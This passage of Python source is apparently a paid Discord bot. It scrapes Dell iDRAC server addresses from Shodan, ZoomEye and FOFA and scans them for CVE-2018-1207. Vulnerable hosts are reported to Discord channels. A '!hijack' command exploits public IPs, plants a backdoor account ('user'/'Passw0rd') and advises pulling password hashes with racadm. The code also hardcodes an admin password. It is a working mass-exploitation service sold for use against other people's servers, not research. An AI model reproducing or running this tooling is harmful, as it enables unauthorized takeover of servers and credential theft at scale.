                sLicense = oResponse.text.split(r'<prodClassName>')[1].split(r'</prodClassName>')[0]
                
                oResponse = self.get_page(sURL + '/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc', sProxy)
                if oResponse:
                    import json as json_module
                    oJson = json_module.loads(oResponse.text)['aimGetProp']
                    sHostname = oJson['hostname']
                    sFWversion = oJson['fwVersion']
                    sSystem = oJson['sysDesc']
                    
                    return {
                        'ip': sIP,
                        'hostname': sHostname,
                        'version': sIDRACVersion,
                        'license': sLicense,
                        'firmware': sFWversion,
                        'system': sSystem
                    }
            except:
                pass
        
        # iDRAC 9 attempt
        oResponse = self.get_page(sURL + '/restgui/locale/strings/locale_str_en.json', sProxy)
        if oResponse and oResponse.status_code == 200:
            try:
                import json as json_module
                oJson = json_module.loads(oResponse.text)
                if oJson['app_title'] == 'iDRAC9':
                    oResponse = self.get_page(sURL + '/restgui/js/services/resturi.js', sProxy)
                    sResult = oResponse.text
                    
                    def getBMCInfo(sResult):
                        lstLines = sResult.split('\n')
                        for sLine in lstLines:
                            if 'var BMC_INFO' in sLine: 
                                return sLine.split('"')[1]
                        return ''
                    
                    sEndpoint = getBMCInfo(sResult)
                    oResponse = self.get_page(sURL + sEndpoint, sProxy)
                    oJson = json_module.loads(oResponse.text)['Attributes']
                    
                    sHostname = oJson['iDRACName']
                    sFWversion = oJson['FwVer'] if 'FwVer' in oJson else self.get_fw_via_redfish(sURL, sProxy)
                    sSystem = oJson['SystemModelName']
                    sLicense = oJson['License']
                    
                    return {
                        'ip': sIP,
                        'hostname': sHostname,
                        'version': 'iDRAC9',
                        'license': sLicense,
                        'firmware': sFWversion,
                        'system': sSystem
                    }
            except:
                pass
        
        return None
    
    def get_fw_via_redfish(self, sURL, sProxy):
        """Get firmware version via Redfish API"""
        oResponse = self.get_page(sURL + '/redfish/v1/Registries/ManagerAttributeRegistry/ManagerAttributeRegistry.v1_0_0.json', sProxy)
        if oResponse:
            import json as json_module
            oJson = json_module.loads(oResponse.text)
            return oJson['SupportedSystems'][0]['FirmwareVersion']
        return 'Unknown'
    
    def check_cve_2018_1207(self, sIP, sProxy=None, idrac_info=None):
        """Check for CVE-2018-1207 vulnerability"""
        sURL = f'https://{sIP}/cgi-bin/login?LD_DEBUG=files'
        oSession = requests.Session()
        oSession.mount('https://', CustomHTTPAdapter())
        
        try:
            if sProxy:
                oResponse = oSession.get(sURL, verify=False, proxies={'https': sProxy}, headers=self.headers, timeout=self.timeout)
            else:
                oResponse = oSession.get(sURL, verify=False, headers=self.headers, timeout=self.timeout)
            
            # Check for DEFINITE vulnerability
            if 'calling init: /lib/' in oResponse.text:
                print(f'  [!!] {sIP} is definitely vulnerable and can be exploited: {sURL}')
                
                # Extract version info
                if idrac_info:
                    version_parts = idrac_info['version'].split()
                    version_type = version_parts[0] if len(version_parts) > 0 else "iDRAC"
                    license_type = version_parts[1] if len(version_parts) > 1 else ""
                    
                    # Send Discord alert with all details
                    send_discord_alert_vuln(
                        ip_address=sIP,
                        cve_id="CVE-2018-1207",
                        hostname=idrac_info['hostname'],
                        version=f"{version_type} {license_type}".strip(),
                        firmware=f"v{idrac_info['firmware']}"
                    )
                else:
                    # Send minimal alert
                    send_discord_alert_vuln(
                        ip_address=sIP,
                        cve_id="CVE-2018-1207",
                        hostname="Unknown",
                        version="iDRAC",
                        firmware="Unknown"
                    )
                
                return True, oResponse.text
            return False, oResponse.text
        except Exception as e:
            return False, str(e)
    
    def scan_ip(self, args):
        """Scan single IP for vulnerabilities"""
        sIP, sProxy, boolVerbose = args
        
        if boolVerbose:
            print(f'[!] Scanning IP: {sIP}')
        
        # First fingerprint the iDRAC
        idrac_info = self.fingerprint_idrac(sIP, sProxy)
        
        if idrac_info:
            print(f'[+] {sIP}: {idrac_info["hostname"]} ({idrac_info["system"]}, {idrac_info["version"]} {idrac_info["license"]}, Firmware v{idrac_info["firmware"]})')
            
            # Check if vulnerable based on version
            boolCVE20181207 = False
            if '8' in idrac_info['version'] or '7' in idrac_info['version']:
                try:
                    fw_parts = idrac_info['firmware'].split('.')
                    if len(fw_parts) >= 2:
                        if int(fw_parts[0]) <= 2 and int(fw_parts[1]) <= 52:
                            boolCVE20181207 = True
                            print(f'  [!] {sIP} is vulnerable to CVE-2018-1207, Code Injection Vulnerability (RCE)')
                except:
                    pass
            
            # Check for definite vulnerability
            if boolCVE20181207:
                print(f'  [*] Checking DEFINITE vulnerability for {sIP}...')
                isDefinitelyVuln, response_text = self.check_cve_2018_1207(sIP, sProxy, idrac_info)
                
                if not isDefinitelyVuln:
                    print(f'  [*] {sIP} is NOT definitely vulnerable (LD_DEBUG=files check failed)')
        else:
            if boolVerbose:
                print(f'[-] {sIP}: Not an iDRAC system or not accessible')
        
        return idrac_info

# ================= END VULNERABILITY SCANNER =================

# REST OF THE ORIGINAL CODE CONTINUES HERE
class ImportantLogFilter(logging.Filter):
    def filter(self, record):
        important_keywords = [
            'failed', 'error', 'critical', 'warning', 'connected', 'disconnected',
            'Starting scrape cycle', 'Completed scrape cycle', 'Successfully saved',
            'Bot connected', 'status updated', 'Starting status update'
        ]
        return record.levelno != logging.INFO or any(keyword in record.getMessage() for keyword in important_keywords)

class LogFormatter(logging.Formatter):
    LOG_TYPES = {
        'Successfully connected to SQLite': 'Database',
        'Failed to connect to SQLite': 'Database Error',
        'Database.*disconnected': 'Database Error',
        'Status channel updated': 'Status Update',
        'Status updates paused': 'Status Update',
        'Successfully saved.*IPs': 'Database',
        'Failed to save': 'Database Error',
        'Starting scrape cycle': 'Scraper',
        'Completed scrape cycle': 'Scraper',
        'No new IPs': 'Scraper',
        'Non-200 response': 'Scraper Error',
        'Fetch.*failed': 'Scraper Error',
        'Bot connected as': 'Bot',
        'Node.*status updated': 'Node',
        'General save error': 'Database Error',
        'Starting status update': 'Status Update',
        'Completed status update': 'Status Update',
        'Editing status message': 'Status Update',
        'Sending new status message': 'Status Update',
        'Caching IPs due to database unavailability': 'Scraper',
        'Retrying to save cached IPs': 'Scraper',
        'SSL socket error': 'Scraper Error',
        'Checking database liveness': 'Database'
    }
    def format(self, record):
        log_type = 'Info'
        for pattern, type_name in self.LOG_TYPES.items():
            if re.search(pattern, record.msg):
                log_type = type_name
                break
        return f"[{log_type}] {record.msg}"

logger = logging.getLogger(' | Omar IPMI')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
handler.setFormatter(LogFormatter())
handler.addFilter(ImportantLogFilter())
logger.addHandler(handler)

with open('config_ipmi.json', 'r') as f:
    CONFIG = json.load(f)

version = "6.0"
init(autoreset=True)

def print_banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    random_color = random.choice(colors)
    title = figlet_format("IPMI Scraper", font="slant")
    print(random_color + title)
    print(Style.RESET_ALL)
    print(f"{Fore.CYAN}[*] Recoded & Modified by omarikr (linux.developer.){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[*] v6.2 - Go unlimited.{Style.RESET_ALL}")
    print("\n" + "="*50 + "\n")

def print_startup_status(bot_user, db_connected):
    print(f"{Fore.GREEN}[*] Logged in as {bot_user}{Style.RESET_ALL}")
    if db_connected:
        print(f"{Fore.GREEN}[*] Connected to database.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[*] Failed to connect to database.{Style.RESET_ALL}")
    print("\n" + "="*50 + "\n")

parser = argparse.ArgumentParser(description="IPMI Scraper Node")
parser.add_argument('--node-id', type=str, required=False, help="Unique ID for this node")
args = parser.parse_args()
NODE_ID = args.node_id if args.node_id else CONFIG['node_id']
URLS = CONFIG['urls']

class SQLiteManager:
    def __init__(self):
        self.db_path = 'ipmi.db'
        self.conn = None
        self.connect()
        self.create_tables()

    def connect(self):
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            logger.info(f"Successfully connected to SQLite database: {self.db_path}")
        except Exception as e:
            logger.error(f"Failed to connect to SQLite: {e}")
            self.conn = None

    def get_connection(self):
        if self.conn is None:
            self.connect()
        return self.conn

    def create_tables(self):
        conn = self.get_connection()
        if not conn:
            return
        cursor = conn.cursor()
        try:
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scraped_ips (
                    ip_address TEXT PRIMARY KEY,
                    source_url TEXT,
                    first_seen TEXT,
                    node_id TEXT,
                    type TEXT,
                    source_type TEXT
                )
            ''')
            cursor.execute('CREATE TABLE IF NOT EXISTS users (discord_id INTEGER PRIMARY KEY, has_permission BOOLEAN, works BOOLEAN, username TEXT)')
            cursor.execute('CREATE TABLE IF NOT EXISTS ipmi_ips (ip_address TEXT PRIMARY KEY)')
            cursor.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')
            cursor.execute('CREATE TABLE IF NOT EXISTS blacklisted_ips (ip_address TEXT PRIMARY KEY)')
            cursor.execute('CREATE TABLE IF NOT EXISTS accounts (username TEXT PRIMARY KEY, password TEXT, is_permanent BOOLEAN)')
            cursor.execute('CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, username TEXT, created_at TEXT, active BOOLEAN)')
            cursor.execute('CREATE TABLE IF NOT EXISTS nodes (node_id TEXT PRIMARY KEY, status TEXT, ips_scraped INTEGER, last_seen TEXT, urls TEXT)')
            cursor.execute('CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)')
            conn.commit()
            logger.info("SQLite tables created successfully.")
        except Exception as e:
            logger.error(f"Error creating SQLite tables: {e}")
        finally:
            cursor.close()

    def execute(self, query, params=()):
        conn = self.get_connection()
        if not conn: return
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            conn.commit()
        finally:
            cursor.close()

    def executemany(self, query, params):
        conn = self.get_connection()
        if not conn: return
        cursor = conn.cursor()
        try:
            cursor.executemany(query, params)
            conn.commit()
            return cursor.rowcount
        finally:
            cursor.close()

    def fetchone(self, query, params=()):
        conn = self.get_connection()
        if not conn: return None
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            return cursor.fetchone()
        finally:
            cursor.close()

    def fetchall(self, query, params=()):
        conn = self.get_connection()
        if not conn: return []
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            return cursor.fetchall()
        finally:
            cursor.close()

db_manager = SQLiteManager()

async def load_custom_config():
    custom_config_json = db_manager.fetchone("SELECT value FROM config WHERE key = ?", ('custom',))
    custom_config = json.loads(custom_config_json[0]) if custom_config_json else None
    if custom_config:
        CONFIG['custom'] = CONFIG.get('custom', {})
        CONFIG['custom'].update(custom_config)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
bot.last_status_message_id = None

async def generate_session_id():
    return secrets.token_hex(32)

async def invalidate_all_sessions():
    db_manager.execute("DELETE FROM sessions")
    logger.info("All active sessions invalidated")

async def store_session(username, session_id):
    db_manager.execute(
        "INSERT INTO sessions (username, session_id, created_at, active) VALUES (?, ?, ?, ?)",
        (username, session_id, datetime.now(timezone.utc).isoformat(), True)
    )

async def check_session(session_id):
    return db_manager.fetchone("SELECT * FROM sessions WHERE session_id = ? AND active = ?", (session_id, True))

async def ensure_admin_account():
    admin_username = 'intelstriker'
    admin_password = 'Admin123!'
    hashed_password = hashlib.sha256(admin_password.encode()).hexdigest()
    existing_admin = db_manager.fetchone("SELECT * FROM accounts WHERE username = ?", (admin_username,))
    if not existing_admin:
        db_manager.execute(
            "INSERT INTO accounts (username, password, is_permanent) VALUES (?, ?, ?)",
            (admin_username, hashed_password, True)
        )
        logger.info(f"Created permanent admin account: {admin_username}")
    else:
        db_manager.execute(
            "UPDATE accounts SET is_permanent = ? WHERE username = ?",
            (True, admin_username)
        )

class IPView(View):
    def __init__(self, ip_list: List[str], user_id: int, filename: str):
        super().__init__(timeout=180)
        self.ip_list = ip_list
        self.user_id = user_id
        self.filename = filename
        self.current_page = 0
        self.total_pages = (len(ip_list) - 1) // CONFIG['ips_per_page'] + 1
        if self.total_pages <= 1:
            self.children[0].disabled = True
            self.children[1].disabled = True

    def get_page_content(self) -> discord.Embed:
        start_idx = self.current_page * CONFIG['ips_per_page']
        end_idx = start_idx + CONFIG['ips_per_page']
        page_ips = self.ip_list[start_idx:end_idx]
        embed = discord.Embed(
            title=f"IP Collection (Page {self.current_page + 1}/{self.total_pages})",
            color=0x2E2E38,
            description="```css\n" + "\n".join(page_ips) + "\n```"
        )
        embed.set_footer(text=f"Total IPs: {len(self.ip_list)} | VERSION: {version}")
        return embed

    @discord.ui.button(label="Previous", style=discord.ButtonStyle.grey)
    async def previous_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        self.current_page = max(0, self.current_page - 1)
        await interaction.response.edit_message(embed=self.get_page_content(), view=self)

    @discord.ui.button(label="Next", style=discord.ButtonStyle.grey)
    async def next_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        self.current_page = min(self.total_pages - 1, self.current_page + 1)
        await interaction.response.edit_message(embed=self.get_page_content(), view=self)

    @discord.ui.button(label="Download", style=discord.ButtonStyle.grey)
    async def download_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        buffer = io.StringIO()
        buffer.write("\n".join(self.ip_list))
        buffer.seek(0)
        file = discord.File(buffer, filename=self.filename)
        await interaction.response.send_message(file=file, ephemeral=True)
        buffer.close()

@bot.command(name='help')
async def help_command(ctx):
    if not await has_id_permission(ctx.author.id):
        await ctx.send("You are not allowed to use this bot, please purchase the subscription ($6/mo) to use the bot.")
        return

    prefix = ctx.prefix
    COMMAND_CONFIG = {
        "user_commands": {
            "`!ips`": "Fetches all IPs",
            "`!ipinfo <ip>`": "Shows IP details.",
            "`!hijack <ip>`": "Hijack vulnerable iDRAC systems (CVE-2018-1207)",
            "`!scanvulns <target>`": "Scan IP/CIDR/file for vulnerable iDRAC systems"  # ADDED THIS LINE
        },
        "admin_commands": {
            "`!adduser <@user>`": "Grants access.",
            "`!removeuser <@user>`": "Revoke access.",
            "`!setstatus #channel`": "Assigns status channel."
        },
        "category_descriptions": {
            "user_commands": "Tools for accessing and exploiting IPMI systems.",
            "admin_commands": "Admin tools for managing access and bot settings."
        }
    }
    embed = discord.Embed(
        title="IPMI Bot Help Command",
        description=(
            f"My prefix is `{prefix}`\n\n"
            "Enjoy unmatched speeds and a robust suite of IP tools\n"
            "packed into one powerful, easy-to-use bot built for\n"
            "performance and precision\n\n"
        ),
        color=discord.Color.default()
    )
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text=f"VERSION: {version}", icon_url=bot.user.avatar.url if bot.user.avatar else None)
    embed.add_field(
        name="User Commands",
        value=COMMAND_CONFIG["category_descriptions"]["user_commands"],
        inline=False
    )
    embed.add_field(
        name="Admin Commands",
        value=COMMAND_CONFIG["category_descriptions"]["admin_commands"],
        inline=False
    )

    def create_command_embed(category):
        new_embed = discord.Embed(
            title=f"IPMI Bot Help Command - {category}",
            description=f"My prefix is `{prefix}`\n\nList of commands for the selected category:",
            color=discord.Color.default()
        )
        if ctx.guild.icon:
            new_embed.set_thumbnail(url=ctx.guild.icon.url)
        new_embed.set_footer(text=f"VERSION: {version}", icon_url=bot.user.avatar.url if bot.user.avatar else None)
        commands_text = "\n".join([f"**{cmd}**: {desc}" for cmd, desc in COMMAND_CONFIG[f"{category.lower().replace(' ', '_')}"].items()])
        new_embed.add_field(
            name=f"{category}",
            value=commands_text,
            inline=False
        )
        return new_embed

    class HelpSelect(discord.ui.Select):
        def __init__(self):
            options = [
                discord.SelectOption(label="User Commands", description="View commands for all users"),
                discord.SelectOption(label="Admin Commands", description="View commands for admins")
            ]
            super().__init__(placeholder="Select a command category...", min_values=1, max_values=1, options=options)

        async def callback(self, interaction: discord.Interaction):
            if interaction.user != ctx.author:
                await interaction.response.send_message("Only the command issuer can use this menu!", ephemeral=True)
                return
            selected = self.values[0]
            new_embed = create_command_embed(selected)
            await interaction.response.send_message(embed=new_embed, ephemeral=True)

    view = discord.ui.View()
    view.add_item(HelpSelect())
    await ctx.send(embed=embed, view=view, ephemeral=True)

# ADD THE SCANVULNS COMMAND
@bot.command(name='scanvulns')
async def scanvulns_command(ctx, target: str, threads: int = 64, proxy: str = None):
    """Scan IP/CIDR/file for vulnerable iDRAC systems"""
    if not await has_id_permission(ctx.author.id):
        await ctx.send("You are not allowed to use this bot, please purchase the subscription ($6/mo) to use the bot.")
        return

    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (ctx.author.id,))
    if not user or not user['works']:
        await ctx.send("Your access is disabled!")
        return

    # Initial response
    embed = discord.Embed(
        title="🔍 iDRAC Vulnerability Scan",
        description=f"Target: `{target}`\nThreads: `{threads}`\nProxy: `{proxy if proxy else 'None'}`\nStatus: Starting...",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Requested by {ctx.author.name}")
    embed.timestamp = datetime.now(timezone.utc)
    
    message = await ctx.send(embed=embed)
    
    try:
        # Update status
        embed.description = f"Target: `{target}`\nThreads: `{threads}`\nProxy: `{proxy if proxy else 'None'}`\nStatus: Preparing scan..."
        embed.color = discord.Color.orange()
        await message.edit(embed=embed)
        
        # Get IPs from target
        def get_ips_from_cidr(cidr):
            """Convert CIDR to list of IPs"""
            def ip2bin(ip):
                b = ''
                inQuads = ip.split('.')
                outQuads = 4
                for q in inQuads:
                    if q != '':
                        b += format(int(q), '08b')
                        outQuads -= 1
                while outQuads > 0:
                    b += '00000000'
                    outQuads -= 1
                return b

            def bin2ip(b):
                ip = ''
                for i in range(0, len(b), 8):
                    ip += str(int(b[i:i+8], 2)) + '.'
                return ip[:-1]

            parts = cidr.split('/')
            if len(parts) == 1:
                return [parts[0]]
            
            baseIP = ip2bin(parts[0])
            subnet = int(parts[1])
            if subnet == 32:
                return [bin2ip(baseIP)]
            
            ipPrefix = baseIP[:-(32-subnet)]
            iplist = []
            for i in range(2**(32-subnet)):
                iplist.append(bin2ip(ipPrefix + format(i, f'0{32-subnet}b')))
            return iplist
        
        def get_ips_from_file(sFile):
            """Get IPs from file"""
            if not os.path.isfile(sFile):
                return []
            
            lstLines = open(sFile, 'r').read().splitlines()
            lstIPs = []
            for sLine in lstLines:
                lstIPs.extend(get_ips_from_cidr(sLine))
            return lstIPs
        
        # Determine target type and get IPs
        if os.path.isfile(target):
            embed.description = f"Target: `{target}`\nThreads: `{threads}`\nProxy: `{proxy if proxy else 'None'}`\nStatus: Reading file..."
            await message.edit(embed=embed)
            
            lstIPs = get_ips_from_file(target)
            target_type = "file"
        else:
            embed.description = f"Target: `{target}`\nThreads: `{threads}`\nProxy: `{proxy if proxy else 'None'}`\nStatus: Parsing CIDR..."
            await message.edit(embed=embed)
            
            lstIPs = get_ips_from_cidr(target)
            target_type = "CIDR" if '/' in target else "IP"
        
        if not lstIPs:
            embed.title = "❌ Scan Failed"
            embed.description = f"No valid IPs found in target: `{target}`"
            embed.color = discord.Color.red()
            await message.edit(embed=embed)
            return
        
        embed.description = f"Target: `{target}`\nThreads: `{threads}`\nIPs to scan: `{len(lstIPs)}`\nStatus: Starting scan..."
        embed.color = discord.Color.gold()
        await message.edit(embed=embed)
        
        # Initialize scanner
        scanner = IDracVulnerabilityScanner()
        
        # Run scan in thread pool
        def run_scan():
            print(f"[!] DUAL DISCORD CHANNELS ACTIVE:")
            print(f"    Chinese IPs → Channel ID: {CHINESE_GROUPCHAT_ID}")
            print(f"    Other IPs   → Channel ID: {NORMAL_GROUPCHAT_ID}")
            print(f"[!] Geolocation-based detection")
            print(f"[!] Vulnerable IPs saved to 2 files:")
            print(f"    1. {VULNERABLE_IPS_FILE} (detailed info)")
            print(f"    2. {CLEAN_IPS_FILE} (clean IPs only - one per line)")
            print(f"[!] Scanning {len(lstIPs)} addresses using up to {threads} threads.")
            
            oPool = ThreadPool(threads)
            results = oPool.map(scanner.scan_ip, zip(lstIPs, repeat(proxy), repeat(False)))
            oPool.close()
            oPool.join()
            return results
        
        # Run scan in executor
        loop = asyncio.get_event_loop()
        scan_results = await loop.run_in_executor(None, run_scan)
        
        # Count results
        vulnerable_count = 0
        idrac_count = 0
        for result in scan_results:
            if result:
                idrac_count += 1
                # Check if definitely vulnerable (Discord alert would have been sent)
                if os.path.exists(VULNERABLE_IPS_FILE):
                    with open(VULNERABLE_IPS_FILE, 'r') as f:
                        lines = f.readlines()
                        for line in lines:
                            if result['ip'] in line:
                                vulnerable_count += 1
                                break
        
        # Final embed
        embed.title = "✅ Scan Complete"
        embed.description = (
            f"**Target:** `{target}`\n"
            f"**Type:** {target_type}\n"
            f"**IPs Scanned:** {len(lstIPs)}\n"
            f"**iDRAC Systems Found:** {idrac_count}\n"
            f"**Definitely Vulnerable:** {vulnerable_count}\n\n"
        )
        
        if vulnerable_count > 0:
            embed.description += (
                f"**🚨 VULNERABLE SYSTEMS FOUND!**\n"
                f"• Alerts sent to Discord channels:\n"
                f"  - Chinese IPs → <#{CHINESE_GROUPCHAT_ID}>\n"
                f"  - Other IPs → <#{NORMAL_GROUPCHAT_ID}>\n"
                f"• Files created:\n"
                f"  - `{VULNERABLE_IPS_FILE}` (detailed info)\n"
                f"  - `{CLEAN_IPS_FILE}` (clean IP list)\n"
            )
            embed.color = discord.Color.green()
        else:
            embed.description += "No definitely vulnerable systems found."
            embed.color = discord.Color.orange()
        
        embed.add_field(
            name="Note",
            value="Definite vulnerabilities require LD_DEBUG=files check to pass.",
            inline=False
        )
        
    except Exception as e:
        embed.title = "⚠️ Scan Error"
        embed.description = f"Error scanning target `{target}`:\n```{str(e)}```"
        embed.color = discord.Color.red()
    
    embed.timestamp = datetime.now(timezone.utc)
    await message.edit(embed=embed)

@bot.command(name='hijack')
async def hijack_command(ctx, target_ip: str):
    """Hijack vulnerable iDRAC systems using CVE-2018-1207"""
    if not await has_id_permission(ctx.author.id):
        await ctx.send("You are not allowed to use this bot, please purchase the subscription ($6/mo) to use the bot.")
        return

    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (ctx.author.id,))
    if not user or not user['works']:
        await ctx.send("Your access is disabled!")
        return

    # Check if IP is valid
    try:
        ip_obj = ip_address(target_ip)
        if ip_obj.is_private:
            await ctx.send("Private IPs are not supported for exploitation.")
            return
    except AddressValueError:
        await ctx.send("Invalid IP address format.")
        return

    # Initial response
    embed = discord.Embed(
        title="💀 iDRAC Hijack Initialized",
        description=f"Target: `{target_ip}`\nExploit: CVE-2018-1207\nStatus: Starting...",
        color=discord.Color.orange()
    )
    embed.set_footer(text=f"Requested by {ctx.author.name}")
    embed.timestamp = datetime.now(timezone.utc)
    
    message = await ctx.send(embed=embed)
    
    try:
        # Update status
        embed.description = f"Target: `{target_ip}`\nExploit: CVE-2018-1207\nStatus: Checking vulnerability..."
        embed.color = discord.Color.gold()
        await message.edit(embed=embed)
        
        # Run exploit in a separate thread to avoid blocking
        def run_exploit():
            exploiter = IDracExploiter()
            return exploiter.exploit(target_ip, verbose=False)
        
        # Use asyncio to run in executor
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, run_exploit)
        
        if result:
            # Success
            embed.title = "✅ iDRAC Hijack Successful"
            embed.description = (
                f"Target: `{target_ip}`\n"
                f"Status: **COMPROMISED**\n\n"
                f"**Credentials Added:**\n"
                f"• Username: `user`\n"
                f"• Password: `Passw0rd`\n"
                f"• User ID: `13`\n\n"
                f"**Access Methods:**\n"
                f"• Web Interface: https://{target_ip}\n"
                f"• racadm CLI: `racadm -r {target_ip} -u user -p Passw0rd`\n\n"
                f"*Note: Allow 5-10 minutes for full reconfiguration*"
            )
            embed.color = discord.Color.green()
            embed.add_field(
                name="Next Steps",
                value="Use `racadm` to retrieve hashes or manage the compromised system.",
                inline=False
            )
        else:
            # Failure
            embed.title = "❌ iDRAC Hijack Failed"
            embed.description = (
                f"Target: `{target_ip}`\n"
                f"Status: **NOT VULNERABLE**\n\n"
                f"Possible reasons:\n"
                f"• Target is not vulnerable (patched or wrong version)\n"
                f"• Network connectivity issues\n"
                f"• Target is not an iDRAC system\n"
                f"• Firewall blocking"
            )
            embed.color = discord.Color.red()
        
    except Exception as e:
        # Error
        embed.title = "⚠️ iDRAC Hijack Error"
        embed.description = (
            f"Target: `{target_ip}`\n"
            f"Status: **ERROR**\n\n"
            f"Error: `{str(e)}`\n"
            f"Exploit failed due to unexpected error."
        )
        embed.color = discord.Color.red()
    
    embed.timestamp = datetime.now(timezone.utc)
    await message.edit(embed=embed)

# REST OF THE ORIGINAL CODE CONTINUES HERE...
class IPScraper:
    def __init__(self, node_id: str, urls: List[str], debug_force_save: bool = False, reset_db: bool = False, batch_size: int = 10):
        self.node_id = node_id
        self.urls = urls + ["https://www.shodan.io/search?query=iPMI", "https://www.zoomeye.ai/searchResult?q=Im1lZ2FyYWMi", "https://en.fofa.info/result?qbase64=Im1lZ2FyYWMi"]
        self.all_ips: Set[str] = set()
        self.pending_ip_data: List[dict] = []
        self.errors: List[str] = []
        self.ips_scraped = 0
        self.debug_force_save = debug_force_save
        self.reset_db = reset_db
        self.batch_size = batch_size
        if not asyncio.run(self.init_db()):
            logger.critical(f"Node {self.node_id}: Failed to initialize database during startup")
            self.all_ips = set()

    async def init_db(self) -> bool:
        try:
            if self.reset_db:
                db_manager.execute("DELETE FROM scraped_ips")
                logger.info(f"Node {self.node_id}: scraped_ips table cleared.")
            logger.info(f"Node {self.node_id}: Database initialized successfully.")
            return True
        except Exception as e:
            logger.error(f"Node {self.node_id}: Failed to initialize database: {e}")
            self.errors.append(f"DB Init Error: {str(e)}")
            return False

    def is_valid_ip(self, ip: str) -> bool:
        try:
            ip_obj = ip_address(ip)
            if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_unspecified:
                return False
            return True
        except AddressValueError:
            return False

    async def save_to_db_bulk(self, ip_data: List[dict]) -> int:
        try:
            unique_ip_data = []
            seen_ips = set()
            for item in ip_data:
                ip = item['ip_address']
                if not self.is_valid_ip(ip):
                    logger.warning(f"Skipping invalid IP: {item['ip_address']} from {item['source_url']}")
                    continue
                if ip not in seen_ips and ip not in self.all_ips:
                    unique_ip_data.append(item)
                    seen_ips.add(ip)

            if not unique_ip_data:
                return 0

            params_to_insert = [
                (d['ip_address'], d['source_url'], d['first_seen'].isoformat(), d['node_id'], d['type'], d['source_type'])
                for d in unique_ip_data
            ]

            inserted_count = db_manager.executemany(
                "INSERT OR IGNORE INTO scraped_ips (ip_address, source_url, first_seen, node_id, type, source_type) VALUES (?, ?, ?, ?, ?, ?)",
                params_to_insert
            )
            if inserted_count > 0:
                logger.info(f"Node {self.node_id}: Successfully saved {inserted_count} new IPs.")
                self.ips_scraped += inserted_count
                self.all_ips.update(item['ip_address'] for item in unique_ip_data)
                try:
                    with open('ipmi_ips.txt', 'a') as f:
                        for item in unique_ip_data:
                            f.write(f"{item['ip_address']}\n")
                    logger.info(f"Node {self.node_id}: Successfully appended {inserted_count} new IPs to ips.txt")
                except Exception as e:
                    logger.error(f"Node {self.node_id}: Failed to write to ips.txt: {e}")
            return inserted_count
        except Exception as e:
            logger.error(f"Node {self.node_id}: General save error: {e}")
            self.errors.append(f"General Save Error: {str(e)}")
            self.pending_ip_data.extend(ip_data)
            return 0

    async def fetch_page(self, session: aiohttp.ClientSession, url: str, page_num: int = 1) -> tuple:
        domain = urlparse(url).netloc
        page_params = {
            "shodan.io": f"&page={page_num}",
            "app.netlas.io": f"&page={page_num}",
            "fofa.info": f"&page={page_num}",
            "zoomeye.org": f"&p={page_num}"
        }
        page_url = f"{url}{page_params.get(domain, '') if page_num > 1 else ''}"

        max_retries = 8
        for attempt in range(max_retries):
            try:
                async with session.get(page_url, timeout=ClientTimeout(total=15)) as response:
                    if response.status == 200:
                        logger.info(f"Node {self.node_id}: Successfully fetched {page_url}")
                        return (url, await response.text())
                    elif response.status == 429:
                        retry_after = response.headers.get('Retry-After')
                        wait_time = (2 ** attempt) + random.uniform(0.5, 1.5)
                        if retry_after:
                            try:
                                wait_time = min(float(retry_after), 30) + random.uniform(0.5, 1.0)
                                logger.warning(f"Node {self.node_id}: Rate limited (429) for {page_url}, Retry-After: {retry_after}s, waiting {wait_time:.2f}s")
                            except ValueError:
                                logger.warning(f"Node {self.node_id}: Rate limited (429) for {page_url}, invalid Retry-After, waiting {wait_time:.2f}s")
                        else:
                            wait_time = min(wait_time, 30)
                            logger.warning(f"Node {self.node_id}: Rate limited (429) for {page_url}, no Retry-After, waiting {wait_time:.2f}s")
                        await asyncio.sleep(wait_time)
                        continue
                    else:
                        logger.warning(f"Node {self.node_id}: Non-200 response for {page_url}: {response.status}")
                        self.errors.append(f"Fetch {page_url}: Status {response.status}")
                        await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
                        continue
            except aiohttp.ClientSSLError as e:
                logger.error(f"Node {self.node_id}: SSL socket error for {page_url}: {str(e)}")
                self.errors.append(f"SSL Error {page_url}: {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
            except aiohttp.ClientConnectionError as e:
                logger.warning(f"Node {self.node_id}: Fetch attempt {attempt + 1} failed for {page_url}: Connection error - {str(e)}")
                self.errors.append(f"Fetch {page_url} Attempt {attempt + 1}: Connection error - {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
            except aiohttp.ServerTimeoutError as e:
